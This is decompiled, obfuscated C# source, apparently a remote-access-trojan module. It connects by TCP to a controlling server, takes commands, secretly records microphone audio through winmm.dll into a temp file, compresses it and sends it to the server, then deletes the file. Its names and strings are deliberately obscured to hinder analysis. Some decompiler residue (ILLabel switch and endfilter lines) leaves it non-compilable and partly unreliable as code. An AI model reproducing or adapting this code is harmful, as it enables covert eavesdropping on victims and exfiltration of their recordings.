using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using System;
using System.Diagnostics;
using System.IO;
using System.IO.Compression;
using System.Net.Sockets;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Windows.Forms;

public class ________________________________
{
	private delegate void _________________________________(string string_0);

	private bool __;

	private ________________________________._________________________________ ___;

	public System.IO.StreamWriter ____;

	public System.IO.StreamReader _____;

	private string ______;

	public string _______;

	private int ________;

	private bool _________;

	private event ________________________________._________________________________ _
	{
		[System.Runtime.CompilerServices.MethodImpl(System.Runtime.CompilerServices.MethodImplOptions.Synchronized)]
		add
		{
			this.___ = (________________________________._________________________________)System.Delegate.Combine(this.___, value);
		}
		[System.Runtime.CompilerServices.MethodImpl(System.Runtime.CompilerServices.MethodImplOptions.Synchronized)]
		remove
		{
			this.___ = (________________________________._________________________________)System.Delegate.Remove(this.___, value);
		}
	}

	public ________________________________()
	{
		this.__ = false;
		this.______ = <Module>._____<string>(1355333096u);
		this._______ = <Module>.___<string>(657767552u);
		this.________ = 5000;
		this._________ = false;
	}

	public void ___(string string_0)
	{
		string arg_84_0 = string_0;
		int arg_7F_0 = 35074;
		int arg_7F_1 = System.Type.EmptyTypes.Length + 35811;
		int __________ = <Module>.___________;
		string_0 = ___________________________________________________________________._(arg_84_0, <Module>.__________(arg_7F_0, arg_7F_1, (__________ + 7 * __________ == 7669) ? (((3584 & 2 * -(1742782464 & __________)) == (3584 & __________ << 14)) ? ((~((__________ << 25) * 256) == (1981546496 * __________ ^ -1441)) ? 1115932297 : -2017877775) : (System.Type.EmptyTypes.Length + -1708157625)) : (System.Type.EmptyTypes.Length + 93)));
		try
		{
			string[] array;
			int arg_166_0;
			if (string_0.Contains(<Module>._____<string>(2815274875u)))
			{
				array = Strings.Split(string_0, <Module>._______<string>(1023697363u), -1, CompareMethod.Binary);
				int num = sizeof(ulong) + -3148;
				arg_166_0 = sizeof(ushort) + 1;
				goto IL_166;
			}
			goto IL_1C3;
			do
			{
				IL_1AA:
				int num;
				if (Operators.CompareString(string_0, <Module>.____<string>(4283754960u), false) == 0)
				{
					int arg_189_0 = 296222720;
					int num2 = ______________________._______;
					if ((arg_189_0 * num2 & 6419) != 0)
					{
						goto Block_11;
					}
					if (num != -3140)
					{
						goto Block_12;
					}
					this.__________();
				}
				if (!string_0.Contains(<Module>._____<string>(3424309708u)))
				{
					goto IL_121;
				}
				num = 29814;
			}
			while (System.Type.EmptyTypes.Length + -17939 != -17939);
			this._________ = true;
			this.________ = System.Convert.ToInt32(array[1]);
			arg_166_0 = sizeof(ulong) + -7;
			goto IL_166;
			Block_11:
			Block_12:
			goto IL_155;
			IL_121:
			if (string_0.Contains(<Module>.___<string>(1238117332u)))
			{
				goto IL_155;
			}
			IL_133:
			if (Operators.CompareString(string_0, <Module>.____<string>(2204748370u), false) == 0)
			{
				arg_166_0 = sizeof(float) + -4;
				goto IL_166;
			}
			goto IL_23A;
			IL_155:
			this._________ = false;
			goto IL_133;
			IL_15E:
			this.____();
			goto IL_121;
			IL_166:
			switch (arg_166_0)
			{
			case 0:
			{
				System.IO.MemoryStream memoryStream = new System.IO.MemoryStream();
				string text = <Module>.____<string>(1830698961u) + this._______ + ______________________________________________________________.________________________ + this._______;
				memoryStream.Write(this.________(text), 0, text.Length);
				this._______(memoryStream.ToArray());
				memoryStream.Dispose();
				break;
			}
			case 1:
				goto IL_15E;
			case 2:
				goto IL_155;
			case 3:
			{
				IL_1C3:
				int num = -3140;
				int arg_1DD_0 = 11;
				int arg_1D6_0 = 29;
				int ________________ = <Module>._________________;
				if ((arg_1DD_0 & arg_1D6_0 * ________________ + 35 * ________________) != 0)
				{
					goto IL_15E;
				}
				goto IL_1AA;
			}
			default:
				goto IL_1AA;
			}
			IL_23A:;
		}
		catch (System.Exception expr_23C)
		{
			ProjectData.SetProjectError(expr_23C);
			ProjectData.ClearProjectError();
		}
	}

	public void ____()
	{
		try
		{
			Stopwatch stopwatch = new Stopwatch();
			stopwatch.Start();
			System.Random random = new System.Random();
			string text = System.IO.Path.GetTempPath() + Conversions.ToString(random.Next(1000, 9000)) + <Module>._______<string>(4248601141u);
			int num = checked((int)4.0);
			int arg_305_0 = num;
			byte[] array;
			System.IO.MemoryStream memoryStream;
			string text4;
			while (true)
			{
				string text2;
				string text3;
				int num3;
				switch (arg_305_0)
				{
				case 0:
					text2 = <Module>._______<string>(3352870098u);
					text3 = <Module>.__________(System.Type.EmptyTypes.Length + 5807, System.Type.EmptyTypes.Length + 7244, System.Type.EmptyTypes.Length + 234);
					______________________________________________.mciSendStringA(ref text2, ref text3, 0L, 0L);
					arg_305_0 = System.Type.EmptyTypes.Length + 2;
					continue;
				case 1:
					goto IL_32B;
				case 2:
					break;
				case 3:
				{
					stopwatch.Stop();
					text2 = <Module>._______<string>(2621456699u) + text;
					int num2 = System.Type.EmptyTypes.Length + 18697;
					int arg_28E_0 = 7228;
					int _______________ = <Module>.________________;
					arg_305_0 = (((arg_28E_0 ^ -(_______________ & 1073740712)) == 0) ? (System.Type.EmptyTypes.Length + 1731531566) : (sizeof(System.Guid) + -10));
					continue;
				}
				case 4:
					goto IL_1AC;
				case 5:
					goto IL_32D;
				case 6:
				{
					text3 = <Module>.__________(System.Type.EmptyTypes.Length + 20006, sizeof(int) + 21426, 93);
					______________________________________________.mciSendStringA(ref text2, ref text3, 0L, 0L);
					int num2;
					if (num2 != 18238)
					{
						text2 = <Module>._____<string>(3555353906u);
						text3 = <Module>.__________(sizeof(ulong) + 69351, ((7564 ^ 50 * num3 + num3 * 14 - 3143) == 0) ? (System.Type.EmptyTypes.Length + -1243851122) : (System.Type.EmptyTypes.Length + 70850), System.Type.EmptyTypes.Length + 195);
						______________________________________________.mciSendStringA(ref text2, ref text3, 0L, 0L);
						num2 = 19088;
						System.Threading.Thread.Sleep(250);
						if (!this._________)
						{
							System.IO.File.Delete(text);
							arg_305_0 = System.Type.EmptyTypes.Length + 1;
							continue;
						}
						if (System.IO.File.Exists(text))
						{
							array = ________________________________._____(System.IO.File.ReadAllBytes(text));
							num2 = 14552;
							memoryStream = new System.IO.MemoryStream();
							text4 = <Module>.____<string>(2900636504u) + this._______;
							arg_305_0 = System.Type.EmptyTypes.Length + 5;
							continue;
						}
						goto IL_36D;
					}
					break;
				}
				default:
					goto IL_1AC;
				}
				while (stopwatch.ElapsedMilliseconds < (long)this.________)
				{
					Application.DoEvents();
				}
				arg_305_0 = System.Type.EmptyTypes.Length + 3;
				continue;
				IL_1AC:
				text3 = <Module>._______<string>(2402366507u);
				num3 = ______________________._______;
				int arg_224_0 = ((num3 << 2) + 4334 == -7847) ? (System.Type.EmptyTypes.Length + -2017674079) : 63454;
				int arg_1F0_0 = 7284;
				int num4 = <Module>.__________;
				text2 = <Module>.__________(arg_224_0, ((((uint)(arg_1F0_0 | num4) >> 30 ^ (uint)num4 >> 30) & 2u) != 0u) ? (System.Type.EmptyTypes.Length + -329111322) : (System.Type.EmptyTypes.Length + 64788), sizeof(double) + 213);
				______________________________________________.mciSendStringA(ref text3, ref text2, 0L, 0L);
				arg_305_0 = System.Type.EmptyTypes.Length + 0;
			}
			IL_32B:
			return;
			IL_32D:
			memoryStream.Write(this.________(text4), 0, text4.Length);
			memoryStream.Write(array, 0, array.Length);
			this._______(memoryStream.ToArray());
			memoryStream.Dispose();
			System.IO.File.Delete(text);
			IL_36D:;
		}
		catch (System.Exception expr_36F)
		{
			ProjectData.SetProjectError(expr_36F);
			System.Exception ex = expr_36F;
			______________________________________________________________.______________(<Module>.______<string>(3474929201u), <Module>._____<string>(4249341089u) + ex.ToString());
			ProjectData.ClearProjectError();
		}
	}

	public static byte[] _____(byte[] byte_0)
	{
		System.IO.MemoryStream memoryStream = new System.IO.MemoryStream();
		DeflateStream deflateStream = new DeflateStream(memoryStream, CompressionMode.Compress, true);
		deflateStream.Write(byte_0, 0, byte_0.Length);
		deflateStream.Close();
		return memoryStream.ToArray();
	}

	public void ______()
	{
		try
		{
			______________________________________________________________.______________(<Module>.___<string>(982404538u), <Module>.______<string>(2010400639u));
			this._ = new TcpClient(______________________________________________________________._____________, ______________________________________________________________.______________);
			int arg_9A_0 = System.Type.EmptyTypes.Length + 1;
			int num;
			while (true)
			{
				switch (arg_9A_0)
				{
				case 0:
					goto IL_A9;
				}
				this._.ReceiveBufferSize = 9999999;
				this._.SendBufferSize = 9999999;
				int _______________ = <Module>.________________;
				num = ((((_______________ << 14 ^ _______________ * 65536) | -4419) == -4419) ? (sizeof(byte) + -4386) : (System.Type.EmptyTypes.Length + -947013799));
				arg_9A_0 = sizeof(byte) + -1;
			}
			IL_A9:
			if (!this.__)
			{
				this.__ = true;
				this._ += new ________________________________._________________________________(this.___);
				if (num != 16027)
				{
				}
			}
			this._.GetStream().BeginRead(new byte[]
			{
				0
			}, 0, 0, new System.AsyncCallback(this.___________), null);
			System.Threading.Thread.Sleep(500);
			string string_ = <Module>.______<string>(36610759u) + ______________________________________________________________.________________________ + <Module>.______<string>(861631917u);
			this.____________(string_);
		}
		catch (System.Exception expr_134)
		{
			ProjectData.SetProjectError(expr_134);
			System.Exception ex = expr_134;
			______________________________________________________________.______________(<Module>.___<string>(1387161447u), <Module>.____<string>(3234593318u) + ex.ToString());
			this.__________();
			ProjectData.ClearProjectError();
		}
	}

	public void _______(byte[] byte_0)
	{
		try
		{
			System.IO.MemoryStream memoryStream = new System.IO.MemoryStream();
			memoryStream.Write(byte_0, 0, byte_0.Length);
			memoryStream.Write(this.________(this.______), 0, this.______.Length);
			this._.Client.Send(memoryStream.ToArray(), 0, (int)memoryStream.Length, SocketFlags.None);
		}
		catch (System.Exception expr_51)
		{
			ProjectData.SetProjectError(expr_51);
			this.__________();
			ProjectData.ClearProjectError();
		}
	}

	public byte[] ________(string string_0)
	{
		return System.Text.Encoding.Default.GetBytes(string_0);
	}

	public string _________(byte[] byte_0)
	{
		return System.Text.Encoding.Default.GetString(byte_0);
	}

	public void __________()
	{
		int num;
		int num3;
		try
		{
			IL_00:
			int num2;
			do
			{
				ProjectData.ClearProjectError();
				num = 1;
				IL_03:
				num2 = 2;
				System.Threading.Thread.Sleep(500);
			}
			while ((((3 & ~(num * 15 + num)) == (int)(3u & (uint)((num << 29) - 1005) >> 27)) ? (sizeof(long) + 20338) : (sizeof(double) + 575091091)) != 20346);
			IL_57:
			num2 = 3;
			this._.Close();
			IL_64:
			num2 = 4;
			this.____.Close();
			IL_71:
			num2 = 5;
			this._____.Close();
			IL_7E:
			num2 = 6;
			System.Threading.Thread.CurrentThread.Abort();
			IL_8A:
			goto IL_F7;
			IL_8C:
			int arg_91_0 = num3 + 1;
			num3 = 0;
			@switch(ICSharpCode.Decompiler.ILAst.ILLabel[], arg_91_0);
			IL_B6:
			goto IL_EC;
			num3 = num2;
			@switch(ICSharpCode.Decompiler.ILAst.ILLabel[], num);
			IL_C9:
			goto IL_EC;
		}
		object arg_CB_0;
		endfilter(arg_CB_0 is System.Exception & num != 0 & num3 == 0);
		IL_EC:
		throw ProjectData.CreateProjectError(-2146828237);
		IL_F7:
		if (num3 != 0)
		{
			ProjectData.ClearProjectError();
		}
	}

	public void ___________(System.IAsyncResult iasyncResult_0)
	{
		try
		{
			this._____ = new System.IO.StreamReader(this._.GetStream());
			________________________________._________________________________ ________________________________ = this.___;
			if (________________________________ != null)
			{
				________________________________(this._____.ReadLine());
			}
			this._.GetStream().BeginRead(new byte[]
			{
				0
			}, 0, 0, new System.AsyncCallback(this.___________), null);
		}
		catch (System.Exception expr_60)
		{
			ProjectData.SetProjectError(expr_60);
			this.__________();
			ProjectData.ClearProjectError();
		}
	}

	public void ____________(string string_0)
	{
		try
		{
			this.____ = new System.IO.StreamWriter(this._.GetStream());
			this.____.WriteLine(<Module>.____<string>(2523488060u) + string_0);
			this.____.Flush();
		}
		catch (System.Exception expr_3E)
		{
			ProjectData.SetProjectError(expr_3E);
			this.__________();
			ProjectData.ClearProjectError();
		}
	}

	[System.Runtime.InteropServices.DllImport("winmm.dll")]
	public static extern long mciSendStringA(string string_0, string string_1, long long_0, long long_1);
}
